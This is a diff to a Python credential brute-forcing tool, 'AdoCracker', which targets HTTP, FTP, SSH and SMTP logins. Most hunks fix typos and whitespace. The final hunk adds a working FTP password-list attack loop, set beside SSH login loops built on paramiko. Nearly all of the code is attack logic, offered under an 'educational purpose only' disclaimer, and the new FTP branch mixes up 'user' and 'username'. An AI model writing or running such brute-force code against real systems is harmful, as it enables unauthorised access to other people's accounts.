@@ -11,12 +11,12 @@ import ftplib
 banner = "AdoCracker"
 print(figlet_format(banner, font="standard"))
 print("\033[1;92m[*] This is a password cracker tool for HTTP, FTP, SSH and SMTP")
-print("\033[1;33m[*] This tool is for educational purpose \n\033[1;31m[*] Do not use it on systems you are not "
+print("\033[1;33m[*] This tool is for educational purpose only \n\033[1;31m[*] Do not use it on systems you are not "
       "authorized to")
 print("\033[1;92m[*] Author @adomigold,", "Github account: https://github.com/adomigold/ \n")
 
 parser = argparse.ArgumentParser()
-parser.add_argument('-a', '--attack', type=str, help="Target url or IP adress")
+parser.add_argument('-a', '--attack', type=str, help="Target url or IP address")
 parser.add_argument('-l', '--login', type=str, help="Target username")
 parser.add_argument('-L', '--login_file', type=str, help="File contain usernames")
 parser.add_argument('-C', '--colon_file', help="Colon separated 'login:password' files")
@@ -27,8 +27,8 @@ parser.add_argument('-v', '--verbose', nargs='?', help="Enter show to see login 
 parser.add_argument('-s', '--service', type=str, help="Acceptable services are http, ftp, ssh and smtp")
 parser.add_argument('-r', '--response', type=str, help="Web response after login failed attempt")
 parser.add_argument('-o', '--port', type=int, help="SSH, FTP and SMTP ports")
-parser.add_argument('--username_form', type=str, help="Username form as shown on site sourcode")
-parser.add_argument('--password_form', type=str, help="Password form as shown on site sourcode")
+parser.add_argument('--username_form', type=str, help="Username form as shown on site sourcecode")
+parser.add_argument('--password_form', type=str, help="Password form as shown on site sourcecode")
 args = parser.parse_args()
 
 if len(sys.argv) < 2:
@@ -176,7 +176,6 @@ elif args.service == "ssh":
             for user in user_list:
                 user = user.rstrip()
 
-
                 def open_ssh(target, port, user, password):
                     ssh = paramiko.SSHClient()
                     ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
@@ -207,8 +206,6 @@ elif args.service == "ssh":
                               "\n Username found:", user,
                               "\n------------------------------------------")
                         exit(0)
-
-
                 open_ssh(target, port, user, password)
             else:
                 print("\n\033[1;31m------------------------------------------------------------------"
@@ -224,7 +221,6 @@ elif args.service == "ssh":
                 if ":" in line:
                     user = line.split(':')[0]
                     pwd = line.split(':')[1]
-
 
                     def open_ssh(target, port, user, pwd):
                         ssh = paramiko.SSHClient()
@@ -256,8 +252,6 @@ elif args.service == "ssh":
                                   "\n Username and Password found:", user, "=>", pwd,
                                   "----------------------------------------------------------")
                             exit(0)
-
-
                     open_ssh(target, port, user, pwd)
             else:
                 print("\n\033[1;31m------------------------------------------------------------------"
@@ -273,7 +267,6 @@ elif args.service == "ssh":
 
             for pwd in pwd_list:
                 pwd = pwd.rstrip()
-
 
                 def open_ssh(target, port, username, pwd):
                     ssh = paramiko.SSHClient()
@@ -305,8 +298,6 @@ elif args.service == "ssh":
                               "\n Password found:", pwd,
                               "\n------------------------------------------")
                         exit(0)
-
-
                 open_ssh(target, port, username, pwd)
 
     except KeyboardInterrupt:
@@ -343,7 +334,6 @@ elif args.service == "ftp":
             for user in user_list:
                 user = user.rstrip()
 
-
                 def connect_ftp(target, port, user, password):
                     server = ftplib.FTP()
                     if args.verbose in sys.argv:
@@ -366,8 +356,6 @@ elif args.service == "ftp":
                                   "\n Username found:", user,
                                   "\n------------------------------------------")
                             exit(0)
-
-
                 connect_ftp(target, port, user, password)
 
         # When colon_file is provided
@@ -377,7 +365,6 @@ elif args.service == "ftp":
                 if ":" in line:
                     user = line.split(':')[0]
                     pwd = line.split(':')[1]
-
 
                     def connect_ftp(target, port, user, pwd):
                         server = ftplib.FTP()
@@ -401,9 +388,39 @@ elif args.service == "ftp":
                                       "\n Username and Password found:", user, pwd,
                                       "\n------------------------------------------")
                                 exit(0)
-
-
                     connect_ftp(target, port, user, pwd)
+
+        # When password file is provided
+        else:
+            file = open(password_file)
+            pwd_list = file.readlines()
+
+            for pwd in pwd_list:
+                pwd = pwd.rstrip()
+
+                def connect_ftp(target, port, username, pwd):
+                    server = ftplib.FTP()
+                    if args.verbose in sys.argv:
+                        if args.verbose != "show":
+                            exit(0)
+                        try:
+                            server.connect(target, port, timeout=10)
+                            server.login(user, pwd)
+                        except ftplib.error_perm:
+                            print('\033[1;37m''[+]', username, '_', pwd)
+                            pass
+                        except ConnectionRefusedError:
+                            print(
+                                f"\n\033[1;33m[*] Connection timeout, The script will restart connection in 10 "
+                                f"seconds... "
+                                f"Press CTRL+c to cancel")
+                            time.sleep(10)
+                        else:
+                            print("\n\033[1;92m-----------------------------------------"
+                                  "\n Password found:", pwd,
+                                  "\n------------------------------------------")
+                            exit(0)
+                connect_ftp(target, port, user, pwd)
 
     except KeyboardInterrupt:
         print("\n\033[1;31m[*] CTRL+c detected... Exiting now")
